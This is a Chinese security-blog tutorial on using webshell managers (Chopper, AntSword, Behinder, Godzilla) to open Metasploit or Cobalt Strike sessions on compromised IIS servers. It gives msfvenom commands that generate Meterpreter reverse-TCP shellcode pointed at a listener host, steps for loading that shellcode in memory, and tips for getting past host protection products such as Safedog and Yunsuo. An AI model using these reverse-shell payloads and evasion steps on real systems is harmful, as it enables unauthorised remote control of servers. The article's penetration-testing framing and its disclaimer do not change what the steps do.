---
title: 常用Webshell管理工具上线利用方式
url: https://www.secpulse.com/archives/189104.html
source: 安全脉搏
date: 2022-10-18
fetch_date: 2025-10-03T20:06:24.744127
---

# 常用Webshell管理工具上线利用方式

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 常用Webshell管理工具上线利用方式

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[潇湘信安](https://www.secpulse.com/newpage/author?author_id=37983)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng3.png)

2022-10-17

16,260

|  |
| --- |
| **声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。  请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。 |

**前言**

这篇文章我们主要介绍的是如何利用常用Webshell管理工具中的自定义代码执行功能来上线MSF，附带了中国蚁剑、冰蝎和哥斯拉的内存加载上线，实战渗透中如果遇到以下场景时可尝试文中方法绕过。

**利用场景**

仅支持ASP，WScript.Shell、Shell.Application组件被卸载；又或者支持ASP.NET，但是存在有某些安全防护软件（360、云锁、安全狗等），在这两种场景下可能无法执行命令、上线和提权等。

**注：**目前国内大部分安全防护软件都会对某些进程或进程链的监控较为严格，如果遇到这类场景时可尝试使用以下方式来绕过，但过不了D盾，因为Hook掉了一些上线所需的API，其他防护软件还请自测。

**0x01 中国菜刀**

中国菜刀中并没有直接上线和shellcode加载功能，但是有一个自定义代码执行，我们可以利用这个功能来获取MSF会话。

选择对应Webshell -> 右键“自写脚本”-> 执行ASP脚本上线。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729539.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729540.png)

**0x02 中国蚁剑**

中国蚁剑和菜刀一样，也可以利用As-Exploits后渗透插件中的执行自定义Payload功能来获取MSF会话。

选择对应Webshell -> As-Exploits -> 执行自定义Payload -> 执行ASP脚本上线。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729541.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729542.png)

如果目标主机支持ASP.NET和JSP脚本，我们也可以利用As-Exploits插件中的ShellCode加载器功能来上线CS或MSF，只需生成hex格式的shellcode即可，c、csharp的还需要做些处理。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=443 -f hex
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729543.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729546.png)

**注：**JSP内存加载方式有两种：JNA、Attach，JNA只需要X86的ShellCode即可，而Attach需要根据目标Java位数来选择对应的ShellCode，更多注意事项可在As-Exploits插件中查看。

**0x03 冰蝎**

冰蝎不仅可以利用自定义代码执行功能来获取MSF会话，也可以使用反弹shell功能来获取CS/MSF会话，但是不支持ASP脚本。

连接Webshell -> 自定义代码 -> 执行ASP脚本上线。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729547.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729550.png)

利用反弹shell功能获取会话时只需在Metasploit、CobaltStrike工具中设置好监听，然后在冰蝎客户端中填写VPS监听的公网IP地址和端口就行了，这也能用于目标不出网等场景。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729551.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729552.png)

**注：**反弹shell中的Meterpreter和Shell内置的是x86的shellcode，不可自定义shellcode，如果IIS应用池为64位时可能无法上线，更换x64的Payload也不行，但可以反弹CobaltStrike。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729555.png)

**0x04 哥斯拉**

目标仅支持ASP脚本时我们可以利用哥斯拉中的代码执行功能来获取MSF会话，加密器用的ASP\_RAW，其他的加密器还请自测。

连接Webshell -> 代码执行 -> 执行ASP脚本上线。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729557.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729558.png)

如果支持ASP.NET脚本时我们也可以利用内存加载中的ShellcodeLoader、Meterpreter来获取会话，哥斯拉会根据IIS应用池位数来加载对应的shellcode，不会出现x64上线不了等情况。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729559.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729562.png)

利用ShellcodeLoader获取会话时需要先生成一个C的shellcode，将`x`和`"`及多余字符都删掉，只需留下hex shellcode即可，然后再依次点击load加载和run运行就能获取到会话。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=443 -f c
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729563.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729564.png)

**注：**ShellcodeLoader、Meterpreter都是在w3wp.exe进程下重新创建一个新的rundll32.exe，所以这过不了安全狗“禁止IIS执行程序”，提示`Cannot create process errcode:5`。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-16657295641.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-189104-1665729566.png)

**0x05 文末小结**

本文介绍了4个常用Webshell管理工具的上线方式，都是注入到进程内存中去执行的，1种是注入到w3wp.exe进程；另1种是注入到指定进程，但是是由w3wp.exe创建的子进程，如果防护软件对w3wp.exe进程监控较为严格时则可能无法利用，如安全狗“禁止IIS执行程序”、云锁“操作系统加固”等防护功能。

**本文作者：[潇湘信安](newpage/author?author_id=37983)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/189104.html**](https://www.secpulse.com/archives/189104.html)

Tags: [360](https://www.secpulse.com/archives/tag/360)、[ASP](https://www.secpulse.com/archives/tag/ASP)、[Shell.application](https://www.secpulse.com/archives/tag/shell-application)、[webshell](https://www.secpulse.com/archives/tag/webshell)、[Wscript.shell](https://www.secpulse.com/archives/tag/wscript-shell)、[云锁](https://www.secpulse.com/archives/tag/%E4%BA%91%E9%94%81)、[安全狗](https://www.secpulse.com/archives/tag/%E5%AE%89%E5%85%A8%E7%8B%97)、[菜刀](https://www.secpulse.com/archives/tag/%E8%8F%9C%E5%88%80)、[蚁剑](https://www.secpulse.com/archives/tag/%E8%9A%81%E5%89%91)

点赞：
0
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![一次暴露面全开的红帽渗透测试【getshell】](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/08/1691635073413-300x186.png)

  一次暴露面全开的红帽渗透测试【getsh…](https://www.secpulse.com/archives/202971.html "详细阅读 一次暴露面全开的红帽渗透测试【getshell】")
* [![某次演练复盘总结](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/1687313516203-300x202.png)

  某次演练复盘总结](https://www.secpulse.com/archives/202339.html "详细阅读 某次...